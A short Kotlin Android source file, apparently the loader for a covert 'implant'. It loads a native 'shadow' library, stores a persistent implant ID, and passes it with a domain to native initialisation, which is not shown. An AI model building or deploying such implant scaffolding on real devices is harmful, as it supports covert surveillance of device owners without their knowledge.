package com.shadow

import android.content.Context
import android.util.Log
import java.util.UUID

object ShadowCore {
    private const val TAG = "ShadowCore"
    
    init {
        try {
            System.loadLibrary("shadow")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to load libshadow.so", e)
        }
    }

    // Native functions
    private external fun nativeInit(domain: String, implantId: String): Int
    external fun logEvent(entry: String)

    fun start(context: Context, domain: String) {
        // Generate or retrieve persistent implant ID
        val prefs = context.getSharedPreferences("shadow_state", Context.MODE_PRIVATE)
        var implantId = prefs.getString("implant_id", null)
        
        if (implantId == null) {
            implantId = UUID.randomUUID().toString()
            prefs.edit().putString("implant_id", implantId).apply()
        }

        Log.i(TAG, "Starting ShadowCore... ID: $implantId")
        val res = nativeInit(domain, implantId)
        if (res != 0) {
            Log.e(TAG, "nativeInit failed with code $res")
        }
    }
}
